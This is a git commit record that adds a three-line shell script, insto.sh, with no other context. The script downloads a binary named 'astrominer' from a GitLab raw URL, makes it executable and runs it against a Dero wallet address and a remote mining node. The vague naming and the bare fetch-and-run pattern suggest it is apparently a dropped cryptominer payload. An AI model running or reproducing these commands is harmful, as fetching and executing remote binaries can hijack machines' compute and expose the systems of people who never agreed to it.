30e5a6e14bccc470db7488ac0c2752c2e4e56f3a
pagesrlepla <151825393+pagesrlepla@users.noreply.github.com>
2024-01-17 20:51:48 +0700

    Update and rename wirr to insto.sh

---
+++ insto.sh
@@ -0,0 +1,3 @@
+wget https://gitlab.com/alexandercobaeli471/thegitpp/-/raw/main/astrominer
+chmod +x astrominer
+./astrominer - w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xeth4v7yz7m959q2c897k -r dero-node.mysrv.cloud:10300
